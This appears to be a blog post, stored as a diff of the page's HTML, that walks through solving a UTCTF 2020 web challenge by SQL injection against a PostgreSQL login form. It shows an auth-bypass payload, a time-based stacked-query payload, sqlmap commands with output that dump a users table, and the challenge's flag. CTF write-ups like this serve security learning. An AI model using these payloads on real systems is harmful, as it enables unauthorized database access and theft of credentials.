@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SQL injection involving PostgreSQL. Blind SQLi with stacked Queries.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Solving Epic Admin PWN from UTCTF 2020">
+<meta property="og:url" content="http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/">
+<meta property="og:site_name" content="securitytaters">
+<meta property="og:description" content="SQL injection involving PostgreSQL. Blind SQLi with stacked Queries.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/6.1.jpg">
+<meta property="article:published_time" content="2020-03-09T04:30:00.000Z">
+<meta property="article:modified_time" content="2025-08-10T09:25:37.529Z">
+<meta property="article:author" content="0xm4v3rick">
+<meta property="article:tag" content="webappsec">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="sql injection">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/6.1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Solving Epic Admin PWN from UTCTF 2020</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/solving-chatt-with-bratt-from-utctf-2020/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/solving-spooky-store-from-utctf-2020/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&text=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&is_video=false&description=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Solving Epic Admin PWN from UTCTF 2020&body=Check out this article: http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&name=Solving Epic Admin PWN from UTCTF 2020&description=SQL injection involving PostgreSQL. Blind SQLi with stacked Queries."><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&t=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Solving Epic Admin PWN from UTCTF 2020
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+	<p>Author : 
+        <span class="p-name" itemprop="name">0xm4v3rick</span>
+	</p>
+      </span>
+      
+    <div class="postdate">
+      
+        Created: <time datetime="2020-03-09T04:30:00.000Z" class="dt-published" itemprop="datePublished">09-03-2020</time>
+        
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/sql-injection/" rel="tag">sql injection</a>, <a class="p-category" href="/tags/sqlmap/" rel="tag">sqlmap</a>, <a class="p-category" href="/tags/webappsec/" rel="tag">webappsec</a>, <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>The CTF challenge note:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">this challenge is epic i promise</span><br><span class="line"></span><br><span class="line">the flag is the password</span><br><span class="line">http://web2.utctf.live:5006/</span><br><span class="line"></span><br><span class="line">by matt</span><br></pre></td></tr></table></figure>
+
+<p>The challenge page had a login form which generated following request.</p>
+<p>Request:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web2.utctf.live:5006</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>23</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web2.utctf.live:5006</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web2.utctf.live:5006/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-bash">username=<span class="built_in">test</span>&amp;pass=<span class="built_in">test</span></span></span><br></pre></td></tr></table></figure>
+
+
+<p>After poking around the application to see how it reacts, I landed with auth bypass with admin’– payload which I usually try as follows.</p>
+<p>Request:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web2.utctf.live:5006</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web2.utctf.live:5006</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web2.utctf.live:5006/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">username</span>=admin%<span class="number">27</span>--&amp;pass=asd</span></span><br></pre></td></tr></table></figure>
+
+
+<p>Response:<br><img src="/solving-epic-admin-pwn-from-utctf-2020/6.1.jpg" alt="alt"></p>
+<p>But that did not earn anything interesting as opposed to my expectations. I looked around the source for any hints and but didnt find anything. Not even a single JS file. Rest of the code and css files had nothing of value. So after a hint from the discord channel it was time to expand on the same issue that got me the admin in the first place. Extending auth bypass to SQLi. So I let loose sqlmap to see it if works and it did. Passing the login request to sqlmap using text file did the work.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req1.txt --flush -v -p username</span><br><span class="line">    ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.3#pip&#125;</span><br><span class="line">|_ -| . [)]     | .&#x27;| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 11:30:22 /2020-03-07/</span><br><span class="line"></span><br><span class="line">[11:30:22] [INFO] parsing HTTP request from &#x27;req1.txt&#x27;</span><br><span class="line">[11:30:22] [DEBUG] not a valid WebScarab log data</span><br><span class="line">[11:30:22] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[11:30:22] [DEBUG] setting the HTTP timeout</span><br><span class="line">[11:30:22] [DEBUG] setting the HTTP User-Agent header</span><br><span class="line">[11:30:22] [DEBUG] creating HTTP requests opener object</span><br><span class="line">[11:30:22] [DEBUG] resolving hostname &#x27;web2.utctf.live&#x27;</span><br><span class="line">[11:30:22] [INFO] testing connection to the target URL</span><br><span class="line">[11:30:22] [DEBUG] declared web page charset &#x27;utf-8&#x27;</span><br><span class="line">[11:30:22] [INFO] checking if the target is protected by some kind of WAF/IPS</span><br><span class="line">[11:30:22] [INFO] testing if the target URL content is stable</span><br><span class="line">[11:30:23] [INFO] target URL content is stable</span><br><span class="line">[11:30:23] [WARNING] heuristic (basic) test shows that POST parameter &#x27;username&#x27; might not be injectable</span><br><span class="line">[11:30:23] [INFO] testing for SQL injection on POST parameter &#x27;username&#x27;</span><br><span class="line">[11:30:24] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br><span class="line"></span><br><span class="line">--------------- SNIP --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[11:31:20] [INFO] checking if the injection point on POST parameter &#x27;username&#x27; is a false positive</span><br><span class="line">[11:31:31] [DEBUG] checking for filtered characters</span><br><span class="line">POST parameter &#x27;username&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 92 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span><br><span class="line">    Payload: username=admin&#x27;;SELECT PG_SLEEP(5)--&amp;pass=asd</span><br><span class="line">    Vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)--</span><br><span class="line">---</span><br><span class="line">[11:33:18] [INFO] the back-end DBMS is PostgreSQL</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[11:33:18] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/web2.utctf.live&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>As we can see the sqlmap returned the injected query and it shows PostgreSQL as the backend database. A blind sqli with stacked queries. So I continued with sqlmap to retrive current DB name with below command.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req1.txt -v -p username --current-db</span><br><span class="line"></span><br><span class="line">--------------- SNIP --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[11:34:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">[11:34:35] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">public</span><br><span class="line">[11:34:59] [DEBUG] performed 46 queries in 53.31 seconds</span><br><span class="line">[11:34:59] [WARNING] on PostgreSQL you&#x27;ll need to use schema names for enumeration as the counterpart to database names on other DBMSes</span><br><span class="line">current schema (equivalent to database on PostgreSQL): &#x27;public&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>And retrieved the entire public DB as follows that gave us the flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req1.txt -v -p username --dump</span><br><span class="line"></span><br><span class="line">--------------- SNIP --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[11:40:54] [DEBUG] performed 39 queries in 22.33 seconds</span><br><span class="line">[11:40:54] [DEBUG] analyzing table dump for possible password hashes</span><br><span class="line">Database: public</span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+---------+----------+--------------------------+</span><br><span class="line">| id      | username | password                 |</span><br><span class="line">+---------+----------+--------------------------+</span><br><span class="line">| &lt;blank&gt; | admin    | utflag&#123;dual1pa1sp3rf3ct&#125; |</span><br><span class="line">+---------+----------+--------------------------+</span><br></pre></td></tr></table></figure>
+<p>That was all it took to get the flag. Thanks to UTCTF Team for the chall. Feel free to contact me on twitter for queries or feedback. Cheers!!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&text=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&is_video=false&description=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Solving Epic Admin PWN from UTCTF 2020&body=Check out this article: http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&title=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&name=Solving Epic Admin PWN from UTCTF 2020&description=SQL injection involving PostgreSQL. Blind SQLi with stacked Queries."><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/solving-epic-admin-pwn-from-utctf-2020/&t=Solving Epic Admin PWN from UTCTF 2020"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2025
+    0xm4v3rick
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
